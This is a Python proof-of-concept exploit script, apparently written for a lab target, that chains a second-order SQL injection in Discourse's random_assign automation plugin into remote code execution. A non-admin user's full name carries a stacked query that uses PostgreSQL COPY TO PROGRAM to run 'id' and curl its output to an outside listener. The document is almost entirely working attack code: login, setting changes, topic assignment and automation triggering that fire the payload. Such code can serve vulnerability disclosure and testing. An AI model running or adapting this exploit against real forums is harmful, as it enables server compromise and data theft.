#!/usr/bin/env python3
"""
poc_rce.py — Discourse random_assign 2nd-order SQLi → RCE via COPY ... TO PROGRAM

Chain:
  1. guest (non-admin) sets full name to stacked-query RCE payload
  2. admin enables required site settings
  3. admin creates a fresh topic + assigns guest → action_code_who stored with payload
  4. admin creates random_assign automation targeting that topic
  5. trigger → sink fires `User...joins("...payload...").pluck(:id)` → stacked COPY runs
     as the postgres OS user, which curls http://wsl.evm.pics:9898/<marker>

Requires (on the lab target):
  - discourse-assign and discourse-automation plugins enabled
  - SiteSetting.prioritize_full_name_in_ux = true (hidden, set via rails console)
  - workspace/_accounts.json with admin (admin) and guest
  - An HTTP listener on http://wsl.evm.pics:9898/ reachable from the postgres
    process inside the discourse_dev container

Usage:
  python3 poc_rce.py [BASE_URL]
"""
import datetime
import json
import os
import re
import sys
import time
from pathlib import Path

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE_URL", "http://wsl.evm.pics:31655")).rstrip("/")
LISTENER = os.environ.get("LISTENER", "http://wsl.evm.pics:9898")
MARKER = f"tfRCE{int(time.time())}"
PAYLOAD = (
    "x}'::text[]) WITH ORDINALITY t(username,ord) USING(username);"
    f"COPY(SELECT 1)TO PROGRAM 'id|curl -m 5 --data-binary @- {LISTENER}/{MARKER}';--"
)


def fail(msg):
    print(f"FAIL {msg}", file=sys.stderr)
    sys.exit(1)


def load_accounts():
    for p in (
        os.environ.get("ACCOUNTS_JSON"),
        "workspace/_accounts.json",
        str(Path(__file__).resolve().parents[3] / "workspace" / "_accounts.json"),
    ):
        if p and Path(p).exists():
            return {a["username"]: a for a in json.loads(Path(p).read_text())}
    fail("could not locate workspace/_accounts.json")


def login(account):
    s = requests.Session()
    s.headers.update({"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    csrf = s.get(f"{BASE}/session/csrf", timeout=10).json()["csrf"]
    r = s.post(
        f"{BASE}/session",
        data={"login": account["username"], "password": account["password"]},
        headers={"X-CSRF-Token": csrf},
        timeout=10,
    )
    if r.status_code >= 400:
        fail(f"login {account['username']} {r.status_code} {r.text[:200]}")
    s.headers.update({"X-CSRF-Token": csrf})
    return s


def ensure_settings(admin):
    for name in ("assign_enabled", "discourse_automation_enabled"):
        r = admin.put(f"{BASE}/admin/site_settings/{name}.json", data={name: "true"}, timeout=10)
        if r.status_code not in (200, 204):
            fail(f"set {name}: {r.status_code} {r.text[:200]}")
    r = admin.put(
        f"{BASE}/admin/site_settings/max_assigned_topics.json",
        data={"max_assigned_topics": "9999"},
        timeout=10,
    )
    if r.status_code not in (200, 204):
        fail(f"set max_assigned_topics: {r.status_code} {r.text[:200]}")


def unassign_user(admin, username):
    """Best-effort: clear existing assignments so we don't trip max_assigned_topics."""
    r = admin.get(
        f"{BASE}/topics/messages-assigned/{username}.json",
        params={"order": "activity", "ascending": "false"},
        timeout=15,
    )
    if r.status_code != 200:
        return
    for t in r.json().get("topic_list", {}).get("topics", []):
        tid = t.get("id")
        if not tid:
            continue
        try:
            admin.put(
                f"{BASE}/assign/unassign.json",
                data={"target_id": tid, "target_type": "Topic"},
                timeout=10,
            )
        except requests.RequestException:
            pass


def pick_public_category(admin):
    r = admin.get(f"{BASE}/categories.json", timeout=10)
    r.raise_for_status()
    for c in r.json().get("category_list", {}).get("categories", []):
        if not c.get("read_restricted") and c.get("slug") != "uncategorized":
            return c["id"]
    fail("no public category")


def set_name(attacker, username, payload):
    if len(payload) > 255:
        fail(f"payload {len(payload)}B exceeds User#name 255B limit")
    r = attacker.put(f"{BASE}/u/{username}.json", data={"name": payload}, timeout=10)
    if r.status_code >= 400:
        fail(f"set name: {r.status_code} {r.text[:200]}")


def create_topic(admin, label):
    r = admin.post(
        f"{BASE}/posts.json",
        data={
            "title": f"TF rce poc {label} {int(time.time())}",
            "raw": f"tf rce poc body {label} {int(time.time())}",
            "category": pick_public_category(admin),
        },
        timeout=15,
    )
    if r.status_code >= 400:
        fail(f"create topic: {r.status_code} {r.text[:300]}")
    return r.json()["topic_id"]


def assign_user(admin, topic_id, username):
    r = admin.put(
        f"{BASE}/assign/assign.json",
        data={"target_id": topic_id, "target_type": "Topic", "username": username, "should_notify": "false"},
        timeout=15,
    )
    if r.status_code >= 400:
        fail(f"assign: {r.status_code} {r.text[:300]}")


def create_random_assign(admin, topic_id):
    r = admin.post(
        f"{BASE}/admin/plugins/automation/automations.json",
        json={"automation": {"script": "random_assign", "trigger": "recurring"}},
        timeout=15,
    )
    if r.status_code >= 400:
        fail(f"create automation: {r.status_code} {r.text[:300]}")
    aid = r.json()["automation"]["id"]
    start = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=1)).isoformat()
    fields = [
        {"name": "assignees_group", "component": "group", "target": "script", "metadata": {"value": 3}},
        {"name": "assigned_topic", "component": "text", "target": "script", "metadata": {"value": str(topic_id)}},
        {"name": "recurrence", "component": "period", "target": "trigger",
         "metadata": {"value": {"interval": 1, "frequency": "day"}}},
        {"name": "start_date", "component": "date_time", "target": "trigger", "metadata": {"value": start}},
    ]
    r = admin.put(
        f"{BASE}/admin/plugins/automation/automations/{aid}.json",
        json={"automation": {
            "name": f"TF RCE PoC {MARKER}",
            "script": "random_assign", "trigger": "recurring",
            "enabled": True, "fields": fields,
        }},
        timeout=15,
    )
    if r.status_code >= 400:
        fail(f"update automation: {r.status_code} {r.text[:500]}")
    return aid


def trigger(admin, aid):
    r = admin.post(f"{BASE}/automations/{aid}/trigger.json", timeout=15)
    if r.status_code >= 400:
        fail(f"trigger: {r.status_code} {r.text[:300]}")


def wait_for_query(admin, marker, timeout=40):
    for _ in range(timeout):
        time.sleep(1)
        r = admin.post(f"{BASE}/logs/messages.json", data={"search": marker}, timeout=15)
        if r.status_code != 200:
            continue
        hits = []
        for m in r.json().get("messages", []):
            text = m.get("message", "")
            if marker in text and "User Pluck" in text:
                hits.append(text[:800])
        if hits:
            return hits
    return []


def cleanup(admin, aid):
    try:
        admin.delete(f"{BASE}/admin/plugins/automation/automations/{aid}.json", timeout=10)
    except requests.RequestException:
        pass


def main():
    print(f"[*] base={BASE} listener={LISTENER} marker={MARKER}")
    print(f"[*] payload ({len(PAYLOAD)}B): {PAYLOAD}")
    accounts = load_accounts()
    if "admin" not in accounts or "guest" not in accounts:
        fail("workspace/_accounts.json must contain admin + guest")

    print("[1/6] login admin (admin)…")
    admin = login(accounts["admin"])
    print("[2/6] ensure plugin site settings…")
    ensure_settings(admin)

    print("[3/6] login attacker (guest)…")
    attacker = login(accounts["guest"])
    orig_name = attacker.get(f"{BASE}/session/current.json", timeout=10).json().get("current_user", {}).get("name")

    print("[4/6] guest sets full name to RCE payload…")
    set_name(attacker, "guest", PAYLOAD)

    aid = None
    try:
        print("[5/6] admin creates fresh topic, unassigns prior guest topics, assigns guest, builds + triggers automation…")
        unassign_user(admin, "guest")
        topic_id = create_topic(admin, MARKER)
        assign_user(admin, topic_id, "guest")
        aid = create_random_assign(admin, topic_id)
        trigger(admin, aid)

        print("[6/6] waiting for sink query to appear in Logster…")
        hits = wait_for_query(admin, MARKER)
        if not hits:
            fail("sink query never appeared — hidden setting prioritize_full_name_in_ux probably disabled")
        print(f"[+] sink fired — captured {len(hits)} Logster hit(s)")
        print(f"[+] first hit: {hits[0]}")

        print(f"[*] now check your listener at {LISTENER}/ for a GET /{MARKER} request")
        print("PASS  COPY TO PROGRAM stacked query fired through SQLi; verify listener captured curl")
    finally:
        if aid is not None:
            cleanup(admin, aid)
        if orig_name is not None and os.environ.get("KEEP_PAYLOAD", "0") != "1":
            try:
                attacker.put(f"{BASE}/u/guest.json", data={"name": orig_name}, timeout=10)
            except requests.RequestException:
                pass


if __name__ == "__main__":
    main()
